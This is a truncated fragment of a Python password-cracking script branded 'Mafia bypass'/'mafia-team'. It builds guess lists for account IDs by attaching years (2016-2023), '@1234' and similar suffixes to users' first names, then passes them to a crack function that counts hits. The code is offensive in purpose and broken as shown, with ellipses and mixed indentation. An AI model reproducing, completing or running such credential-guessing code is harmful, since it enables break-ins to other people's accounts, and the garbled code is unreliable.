...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   Mafia bypass
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   Mafia T²
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'2022')
					pwv.append(frs+'@@')
					pwv.append(frst+'@1234')
					pwv.append(frst+'@12345')
					pwv.append(frst+'@123456')
					pwv.append(frst+'2016')
					pwv.append(frst+'2017')
					pwv.append(frst+'2018')
					pwv.append(frst+'2019')
					pwv.append(frst+'2020')
					pwv.append(frst+'2021')
				    pwv.append(frst+'2022')
				    pwv.append(frst+'2023')
				    pwv.append(frst+'2000')
				    pwv.append(frst+'2004')
				    pwv.append(frst+'2005')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [mafia-team] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
